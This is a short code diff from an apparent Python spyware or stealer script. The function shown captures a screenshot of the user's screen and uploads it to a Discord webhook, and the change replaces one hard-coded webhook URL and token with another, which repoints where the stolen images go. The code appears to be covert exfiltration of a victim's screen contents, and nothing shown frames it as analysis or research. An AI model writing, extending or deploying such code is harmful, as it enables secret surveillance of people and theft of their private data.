@@ -41,7 +41,7 @@ def vohan():
         image = screenshot()
         image.save("screenshot.png")
 
-        webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1079361170110156830/gUvzjNf_O2a0QDJNFpj2e4cVsavD3jwq-eRx4w-qfxOz82ofsPI5h7M1jo0ttKm6kJxC")
+        webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1140118915712827392/5As0lJViVTXZjl7IuzHU3M5Cwb5QAtKOVGxMysYTKFZIF8iEdO6nL4KukMPi1OJVrD6A")
         webhook.send(
                 
                 file=File('screenshot.png', filename='screenshot.png')
